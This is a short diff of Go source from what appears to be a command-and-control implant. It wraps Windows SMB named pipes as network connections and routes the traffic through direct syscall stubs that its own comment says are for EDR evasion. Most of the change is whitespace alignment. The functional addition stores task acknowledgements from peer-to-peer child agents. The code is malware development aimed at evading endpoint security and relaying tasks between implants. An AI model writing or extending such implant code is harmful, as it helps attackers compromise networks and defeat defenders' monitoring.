@@ -16,11 +16,11 @@ import (
 // smbConn wraps a Windows named pipe handle as a net.Conn using direct syscalls.
 // All I/O goes through NtReadFile / NtWriteFile syscall stubs for EDR evasion.
 type smbConn struct {
-	handle uintptr
-	sm     *syscallManager
-	mu     sync.Mutex
-	closed bool
-	localAddr net.Addr
+	handle     uintptr
+	sm         *syscallManager
+	mu         sync.Mutex
+	closed     bool
+	localAddr  net.Addr
 	remoteAddr net.Addr
 }
 
@@ -66,8 +66,8 @@ func (c *smbConn) Close() error {
 	return syscallNtCloseHandle(c.sm, c.handle)
 }
 
-func (c *smbConn) LocalAddr() net.Addr  { return c.localAddr }
-func (c *smbConn) RemoteAddr() net.Addr { return c.remoteAddr }
+func (c *smbConn) LocalAddr() net.Addr                { return c.localAddr }
+func (c *smbConn) RemoteAddr() net.Addr               { return c.remoteAddr }
 func (c *smbConn) SetDeadline(t time.Time) error      { return nil }
 func (c *smbConn) SetReadDeadline(t time.Time) error  { return nil }
 func (c *smbConn) SetWriteDeadline(t time.Time) error { return nil }
@@ -177,6 +177,9 @@ func serveOneSMBCient(pipeName string) error {
 	p2pChildLastSeen[childID] = time.Now()
 	if len(req.Results) > 0 {
 		p2pChildResults[childID] = append(p2pChildResults[childID], req.Results...)
+	}
+	if len(req.AckTaskIDs) > 0 {
+		p2pChildAcks[childID] = append(p2pChildAcks[childID], req.AckTaskIDs...)
 	}
 	tasksForChild := p2pChildTasks[childID]
 	delete(p2pChildTasks, childID)
